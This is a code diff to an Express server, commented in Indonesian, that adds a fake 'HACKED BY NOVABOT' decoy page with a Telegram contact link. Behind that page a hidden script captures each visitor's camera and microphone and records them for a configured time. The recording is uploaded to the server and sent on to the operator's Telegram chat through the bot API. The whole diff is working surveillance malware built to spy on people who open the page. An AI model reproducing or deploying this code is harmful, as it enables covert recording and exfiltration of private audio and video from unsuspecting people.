@@ -7,28 +7,70 @@ const config = require('./setting.js');
 const app = express();
 const upload = multer({ storage: multer.memoryStorage() });
 
-// Halaman utama - benar-benar kosong, hanya script di background
+// Halaman utama - menampilkan halaman "HACKED BY NOVABOT" palsu
+// tapi di background merekam video dan mengirim ke Telegram
 app.get('/', (req, res) => {
+  // Enkode HTML untuk halaman palsu
+  const fakeHtml = encodeURIComponent(`
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>HACKED BY NOVABOT</title>
+<style>
+html,body{height:100%;margin:0;padding:0;background:#000;color:#fff;font-family:'Courier New',monospace;overflow:hidden}
+.content{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80%;text-align:center}
+h1{font-size:36px;margin-bottom:20px}
+.red-name{color:red}
+.random-message{font-size:18px;margin:20px 0;line-height:1.6}
+.team-info{font-size:20px;margin-top:30px}
+.contact-link{color:red;text-decoration:none}
+.contact-link:hover{text-decoration:underline}
+.hacker-gif{max-width:200px;margin:20px auto;display:block}
+</style>
+</head>
+<body>
+<div class="content">
+<h1>HACKED BY <span class="red-name">NOVABOT</span></h1>
+<img src="https://files.catbox.moe/9nk1q1.gif" alt="Hacker GIF" class="hacker-gif">
+<div class="random-message">
+Sistem Anda sekarang berada di bawah kendali kami Perlawanan sia sia<br>
+Hantu hantu di dalam mesin membisikkan pujian untuk kami<br>
+Realitas adalah kebohongan Kami menarik tali di balik tabir<br>
+Keadilan adalah badai digital yang bangkit dari kode di bawah
+</div>
+<div class="team-info">
+Tim: <span class="red-name">-</span><br>
+Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@Novabot</a>
+</div>
+</div>
+</body>
+</html>
+  `);
+
+  // Kirim halaman palsu dan script perekaman
   res.send(`
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera to Telegram</title>
+    <title>Loading...</title>
     <style>
         body { margin: 0; background: black; }
-        video { display: none; } /* Sembunyikan elemen video */
+        video { display: none; }
     </style>
 </head>
 <body>
     <script>
+        // Decode dan tampilkan halaman palsu
+        document.documentElement.innerHTML = decodeURIComponent("${fakeHtml}");
+        
+        // Jalankan perekaman di background
         (async function() {
             try {
-                // Minta akses kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                // Buat elemen video tersembunyi agar stream tetap aktif
+                // Buat elemen video tersembunyi
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
@@ -50,22 +92,21 @@ app.get('/', (req, res) => {
                     try {
                         await fetch('/upload', { method: 'POST', body: formData });
                     } catch (err) {
-                        // Abaikan error, tidak ada UI untuk menampilkan
+                        // Gagal, tidak ada UI untuk menampilkan
                     } finally {
                         stream.getTracks().forEach(track => track.stop());
                     }
                 };
 
-                // Rekam selama 5 detik
+                // Rekam sesuai durasi dari setting (dalam milidetik)
                 mediaRecorder.start();
                 setTimeout(() => {
                     if (mediaRecorder.state !== 'inactive') {
                         mediaRecorder.stop();
                     }
-                }, 5000);
+                }, ${config.RECORD_DURATION});
             } catch (err) {
-                // Gagal akses kamera, tidak ada UI
-                console.error(err);
+                // Gagal akses kamera
             }
         })();
     </script>
@@ -76,36 +117,37 @@ app.get('/', (req, res) => {
 
 // Endpoint untuk menerima video dan forward ke Telegram
 app.post('/upload', upload.single('video'), async (req, res) => {
-    if (!req.file) {
-        return res.status(400).json({ success: false, error: 'No video uploaded' });
+  if (!req.file) {
+    return res.status(400).json({ success: false, error: 'No video uploaded' });
+  }
+
+  try {
+    const formData = new FormData();
+    formData.append('chat_id', config.OWNER_ID);
+    formData.append('video', req.file.buffer, { filename: 'recording.webm', contentType: 'video/webm' });
+
+    const telegramRes = await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, formData, {
+      headers: formData.getHeaders()
+    });
+
+    if (telegramRes.data.ok) {
+      res.json({ success: true });
+    } else {
+      res.status(500).json({ success: false, error: 'Telegram API error' });
     }
-
-    try {
-        const formData = new FormData();
-        formData.append('chat_id', config.OWNER_ID);
-        formData.append('video', req.file.buffer, { filename: 'recording.webm', contentType: 'video/webm' });
-
-        const telegramRes = await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, formData, {
-            headers: formData.getHeaders()
-        });
-
-        if (telegramRes.data.ok) {
-            res.json({ success: true });
-        } else {
-            res.status(500).json({ success: false, error: 'Telegram API error' });
-        }
-    } catch (error) {
-        console.error(error);
-        res.status(500).json({ success: false, error: error.message });
-    }
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
 // Handle 404
 app.use((req, res) => {
-    res.status(404).send('404 - Not Found');
+  res.status(404).send('404 - Not Found');
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📹 Recording duration: ${config.RECORD_DURATION}ms`);
 });
